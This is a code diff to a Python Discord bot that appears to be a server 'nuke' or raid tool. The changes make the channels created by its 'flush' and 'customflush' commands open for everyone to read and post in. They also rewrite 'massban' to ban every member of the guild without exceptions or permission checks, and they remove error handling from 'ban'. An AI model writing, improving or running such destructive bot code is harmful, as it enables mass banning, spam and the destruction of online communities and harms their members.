@@ -79,7 +79,7 @@ async def flush(ctx, server_id, yourname):
                 new_channel_name = channel_name.strip()
                 existing_channel = discord.utils.get(guild.channels, name=new_channel_name)
                 overwrites = {
-                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
+                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                     guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                 }
                 new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
@@ -110,7 +110,7 @@ async def customflush(ctx, server_id, channel_amount, channel_name, message_amou
                 new_channel_name = channel_name.strip()
                 existing_channel = discord.utils.get(guild.channels, name=new_channel_name)
                 overwrites = {
-                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
+                    guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                     guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                 }
                 new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
@@ -295,31 +295,19 @@ async def ban(ctx, user_id: int, *, reason="No reason provided."):
         await user.send(f'You have been banned from {ctx.guild.name}. Reason: {reason}')
     except discord.NotFound:
         await ctx.send('User not found.')
-    except discord.Forbidden:
-        await ctx.send('I do not have permission to ban members.')
+
 
 
 @bot.command()
-async def massban(ctx, server_id: int):
-    try:
-        server = bot.get_guild(server_id)
-        if server is None:
-            await ctx.send('Invalid server ID.')
-            return
+async def massban(ctx):
+    guild = ctx.guild
+    members = guild.members
 
-        banned_count = 0
-        for member in server.members:
-            if member != server.me and not member.bot:
-                await server.ban(member, reason=None)
-                banned_count += 1
-                await asyncio.sleep(0.5)  # Add a 0.5-second delay before the next ban
+    for member in members:
+        await guild.ban(member)
+        await asyncio.sleep(0.5)  # Add a delay of 0.5 seconds between each ban
 
-        if banned_count > 0:
-            await ctx.send(f'Successfully banned {banned_count} user(s) in server: {server.name}.')
-        else:
-            await ctx.send(f'No users were eligible for banning in server: {server.name}.')
-    except:
-        await ctx.send('I do not have permission to ban members, or no members were banned.')
+    await ctx.send('Successfully banned all users.')
 
 @bot.command()
 async def dm(ctx, userid, *, messagecontent):
